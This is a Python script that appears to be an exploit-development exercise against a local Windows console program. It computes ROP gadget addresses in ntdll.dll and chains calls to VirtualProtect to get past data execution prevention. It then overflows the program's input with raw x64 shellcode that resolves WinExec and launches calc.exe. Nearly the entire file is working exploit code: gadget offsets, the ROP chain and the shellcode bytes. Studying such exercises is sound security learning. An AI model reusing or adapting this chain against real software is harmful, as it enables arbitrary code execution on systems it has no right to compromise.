#coding: utf-8
import sys
import os
import struct
import subprocess
from ctypes import *

kernel32 = windll.kernel32

ntdll = kernel32.LoadLibraryA('ntdll.dll')
kernel32_handler = kernel32.LoadLibraryA('kernel32.dll')
VirtualProtect = kernel32.GetProcAddress(kernel32_handler,'VirtualProtect')

print "0x%x" % (ntdll)

pop_rcx_retn                    = struct.pack('<q',0x76E19018 - 0x76DC0000 + ntdll)
push_rcx_retn_0                 = struct.pack('<q',0x76ECB194 - 0x76DC0000 + ntdll)
lea_rcx_rsp_plus_20_call_eax    = struct.pack('<q',0x76E04911 - 0x76DC0000 + ntdll)
lea_rcx_rsp_plus_30_call_rbx    = struct.pack('<q',0x76E1B2DA - 0x76DC0000 + ntdll)
mov_r8_rax_call_rsi             = struct.pack('<q',0x76E8128A - 0x76DC0000 + ntdll)
mov_rdx_rbx_call_rax            = struct.pack('<q',0x76EBD765 - 0x76DC0000 + ntdll)
pop_rbx_retn                    = struct.pack('<q',0x76DCB830 - 0x76DC0000 + ntdll)
mov_r9_rsi_call_rax             = struct.pack('<q',0x76EB8913 - 0x76DC0000 + ntdll)
pop_rsi_retn                    = struct.pack('<q',0x76DCDE83 - 0x76DC0000 + ntdll)
pop_rax_retn                    = struct.pack('<q',0x76DDE166 - 0x76DC0000 + ntdll)
dir_data_guarra                 = struct.pack('<q',0x76EE7040 - 0x76DC0000 + ntdll)
new_protection                  = struct.pack('<q',0x40)
VirtualProtectAddress           = struct.pack('<q',VirtualProtect)
jmp_rax                         = struct.pack('<q',0x76E56FD1 - 0x76DC0000 + ntdll)
jmp_rcx                         = struct.pack('<q',0x76E29511 - 0x76DC0000 + ntdll)
int_3                           = struct.pack('<q',0x76DC125E - 0x76DC0000 + ntdll)

process=subprocess.Popen(["ConsoleApplication1.exe"],shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

shell = '\xCC'
shell += "\x99\x65\x48\x8B\x42\x60\x48\x8B\x40\x18\x48\x8B\x70\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x48\x31\xDB\x48\x31\xF6"
shell += "\x8B\x5F\x3C\x48\x01\xFB\xB2\x88\x8B\x1C\x13\x48\x01\xFB\x8B\x73\x20\x48\x01\xFE\x99\x48\x31\xC9"
shell += "\x8B\x86\x00\x00\x00\x00\x48\x01\xF8\x81\x38\x57\x69\x6E\x45\x75\x02\xEB\x09\x48\x83\xC6\x04\x48\xFF\xC1\xEB\xE4\x48\xD1\xC1\x8B\x73\x24\x48\x01\xFE\x99\x48\x01\xCE\x48\x0F\xB7\x0E\x8B\x73\x1C\x48\x01\xFE\x99\x48\xC1\xC1\x02\x48\x01\xCE\x8B\x06\x48\x01\xF8\x99"
shell += "\xEB\x07\x59\x99\x48\xFF\xC2\xFF\xD0\xE8\xF4\xFF\xFF\xFFcalc.exe\x00"

size_to_unprotect               = struct.pack('<q',len(shell))

shellcode = 'A'*12
shellcode += 'B'*4
shellcode += 'CACACACA'
# Set pointer for lpOldProtection
shellcode +=    pop_rsi_retn
shellcode +=    dir_data_guarra
shellcode +=    pop_rax_retn
shellcode +=    pop_rbx_retn            # will be executed by call rax
shellcode +=    mov_r9_rsi_call_rax
# Set new protection
shellcode +=    pop_rax_retn
shellcode +=    new_protection
shellcode +=    pop_rsi_retn
shellcode +=    pop_rbx_retn            # will be executed by call rsi
shellcode +=    mov_r8_rax_call_rsi
# Set size to unprotect
shellcode +=    pop_rbx_retn
shellcode +=    size_to_unprotect
shellcode +=    pop_rax_retn
shellcode +=    pop_rbx_retn
shellcode +=    mov_rdx_rbx_call_rax
# Set pointer to region to unprotect
shellcode +=    pop_rax_retn
shellcode +=    pop_rbx_retn
shellcode +=    lea_rcx_rsp_plus_20_call_eax
# Jump to VirtualProtect
shellcode +=    pop_rax_retn
shellcode +=    VirtualProtectAddress
shellcode +=    jmp_rax
# Jump to shellcode
shellcode +=    pop_rax_retn
shellcode +=    pop_rbx_retn
shellcode +=    lea_rcx_rsp_plus_20_call_eax
shellcode +=    jmp_rcx
shellcode +=    '\x90'*0x18
shellcode +=    shell


print process.communicate(shellcode + '\n')
